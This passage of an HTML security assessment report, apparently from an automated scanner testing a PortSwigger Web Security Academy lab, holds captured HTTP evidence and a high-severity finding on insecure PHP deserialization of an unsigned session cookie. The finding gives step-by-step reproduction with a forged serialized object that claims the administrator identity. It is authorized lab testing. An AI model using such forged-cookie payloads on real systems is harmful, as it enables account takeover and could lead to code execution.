+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $85.24
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=4&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/73.jpg&quot;&gt;
+                            &lt;h3&gt;Beat the Vacation Traffic&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $34.40
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=5&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/58.jpg&quot;&gt;
+                            &lt;h3&gt;There is No &amp;apos;I&amp;apos; in Team&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $94.92
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=6&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/20.jpg&quot;&gt;
+                            &lt;h3&gt;Single Use Food Hider&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $70.58
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=7&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/38.jpg&quot;&gt;
+                            &lt;h3&gt;Six Pack Beer Belt&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $22.00
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=8&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/4.jpg&quot;&gt;
+                            &lt;h3&gt;BURP Protection&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $40.74
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=9&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/16.jpg&quot;&gt;
+                            &lt;h3&gt;Photobomb Backdrops&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $4.63
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=10&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/6.jpg&quot;&gt;
+                            &lt;h3&gt;Com-Tool&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $26.45
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=11&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/23.jpg&quot;&gt;
+                            &lt;h3&gt;Sprout More Brain Power&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $44.57
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=12&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/45.jpg&quot;&gt;
+                            &lt;h3&gt;ZZZZZZ Bed - Your New Home Office&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $26.76
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=13&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/65.jpg&quot;&gt;
+                            &lt;h3&gt;Eco Boat&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $20.53
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=14&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/54.jpg&quot;&gt;
+                            &lt;h3&gt;Robot Home Security Buddy&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $71.28
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=15&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/36.jpg&quot;&gt;
+                            &lt;h3&gt;Caution Sign&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $44.69
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=16&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/48.jpg&quot;&gt;
+                            &lt;h3&gt;BBQ Suitcase&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $56.53
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=17&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/5.jpg&quot;&gt;
+                            &lt;h3&gt;Cheshire Cat Grin&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $39.50
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=18&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/46.jpg&quot;&gt;
+                            &lt;h3&gt;Hitch A Lift&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $46.08
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=19&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/51.jpg&quot;&gt;
+                            &lt;h3&gt;Real Life Photoshopping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $11.90
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=20&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/section&gt;
+                    &lt;!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated --&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr65g821-2m</code> — <code>artifacts/_/ev-mr65g821-2m/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 14438
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                            &lt;a href=&quot;/my-account&quot;&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;ecoms-pageheader&quot;&gt;
+                        &lt;img src=&quot;/resources/images/shop.svg&quot;&gt;
+                    &lt;/section&gt;
+                    &lt;section class=&quot;container-list-tiles&quot;&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/8.jpg&quot;&gt;
+                            &lt;h3&gt;Folding Gadgets&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $21.07
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=1&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/29.jpg&quot;&gt;
+                            &lt;h3&gt;Waterproof Tea Bags&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $9.00
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=2&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/30.jpg&quot;&gt;
+                            &lt;h3&gt;Giant Pillow Thing&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $74.00
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=3&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/61.jpg&quot;&gt;
+                            &lt;h3&gt;Safety First&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $85.24
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=4&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/73.jpg&quot;&gt;
+                            &lt;h3&gt;Beat the Vacation Traffic&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $34.40
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=5&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/58.jpg&quot;&gt;
+                            &lt;h3&gt;There is No &amp;apos;I&amp;apos; in Team&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $94.92
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=6&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/20.jpg&quot;&gt;
+                            &lt;h3&gt;Single Use Food Hider&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $70.58
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=7&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/38.jpg&quot;&gt;
+                            &lt;h3&gt;Six Pack Beer Belt&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $22.00
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=8&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/4.jpg&quot;&gt;
+                            &lt;h3&gt;BURP Protection&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $40.74
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=9&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/16.jpg&quot;&gt;
+                            &lt;h3&gt;Photobomb Backdrops&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $4.63
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=10&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/6.jpg&quot;&gt;
+                            &lt;h3&gt;Com-Tool&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $26.45
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=11&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/23.jpg&quot;&gt;
+                            &lt;h3&gt;Sprout More Brain Power&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $44.57
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=12&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/45.jpg&quot;&gt;
+                            &lt;h3&gt;ZZZZZZ Bed - Your New Home Office&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $26.76
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=13&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/65.jpg&quot;&gt;
+                            &lt;h3&gt;Eco Boat&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $20.53
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=14&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/54.jpg&quot;&gt;
+                            &lt;h3&gt;Robot Home Security Buddy&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $71.28
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=15&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/36.jpg&quot;&gt;
+                            &lt;h3&gt;Caution Sign&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $44.69
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=16&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/48.jpg&quot;&gt;
+                            &lt;h3&gt;BBQ Suitcase&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $56.53
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=17&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/5.jpg&quot;&gt;
+                            &lt;h3&gt;Cheshire Cat Grin&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $39.50
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=18&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/46.jpg&quot;&gt;
+                            &lt;h3&gt;Hitch A Lift&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $46.08
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=19&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/51.jpg&quot;&gt;
+                            &lt;h3&gt;Real Life Photoshopping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $11.90
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=20&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/section&gt;
+                    &lt;!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated --&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [session] Insecure deserialization of session cookie — unsigned, forgeable PHP object identity</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target https://0a14001003ba06e480069a13001b0048.web-security-academy.net/</div>
+<div class="desc">On successful login, POST /login issues a `session` cookie that is a base64-encoded PHP serialized object with no signature/MAC: it decodes to `O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;dr458g7rz05zp9z18uhqs8lpbc57otq3&quot;;}` (evidence ev-mr62ppf2-6). The server base64-decodes and passes this attacker-controlled value straight to PHP `unserialize()` on authenticated routes, with no integrity protection — so identity (`username`) and the auth `access_token` live client-side and are fully forgeable/tamperable.
+
+Proof the cookie reaches the deserializer: with NO cookie, GET /my-account cleanly 302-redirects to /login (ev-mr630vmm-h). When a crafted serialized `User` object is supplied as the cookie instead, the request reaches `unserialize()` and processing throws an unhandled HTTP 500 — reproduced twice, stably, with `username` forged to `administrator` and `access_token` set to the integer literal `0` (`O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:13:&quot;administrator&quot;;s:12:&quot;access_token&quot;;i:0;}`) → 500, 3407-byte error page on both replays (ev-mr62x7ou-f, ev-mr62xbz6-g). A non-serialized garbage cookie likewise 500s on the failed `unserialize()` (ev-mr62vloq-9) rather than being treated as an invalid session, corroborating that the raw cookie is deserialized. The cookie is additionally `SameSite=None`, so it is sent on cross-site requests.
+
+This is an OWASP A08 insecure-deserialization / PHP object-injection sink. It is RCE-class: a suitable POP gadget chain or PHAR payload would likely escalate to code execution or full account/admin takeover (tracked separately as a suspected RCE lead). Even absent a gadget, trusting an unsigned client-serialized object for authentication is broken authentication.</div>
+<div><b>Reproduction</b></div><pre>1. Log in with valid creds: POST /login `username=wiener&amp;password=peter` → 302 /my-account, Set-Cookie `session=&lt;base64&gt;` (ev-mr62ppf2-6).
+2. base64-decode the cookie → `O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;...&quot;;}` (a PHP serialized object, not an opaque token).
+3. Negative control: GET /my-account with no cookie → 302 /login (ev-mr630vmm-h) — deserialization path not taken.
+4. Craft a serialized object, e.g. `O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:13:&quot;administrator&quot;;s:12:&quot;access_token&quot;;i:0;}`, base64-encode, set it as the `session` cookie, GET /my-account → HTTP 500 unhandled `unserialize()` error, reproduced identically twice (ev-mr62x7ou-f, ev-mr62xbz6-g). This proves the server deserializes attacker-controlled bytes.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr630vmm-h</code> — <code>artifacts/s-0002/ev-mr630vmm-h/</code></div><div class="lbl">REQUEST</div><pre>GET /my-account HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+content-length: 0
+location: /login
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr62x7ou-f</code> — <code>artifacts/s-0002/ev-mr62x7ou-f/</code></div><div class="lbl">REQUEST</div><pre>GET /my-account HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+content-length: 3407
+content-type: text/html; charset=utf-8
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labs.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a id='lab-link' class='button' href='/'&gt;Back to lab home&lt;/a&gt;
+                            &lt;button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'&gt;Submit solution&lt;/button&gt;
+                            &lt;script src='/resources/labheader/js/submitSolution.js'&gt;&lt;/script&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;
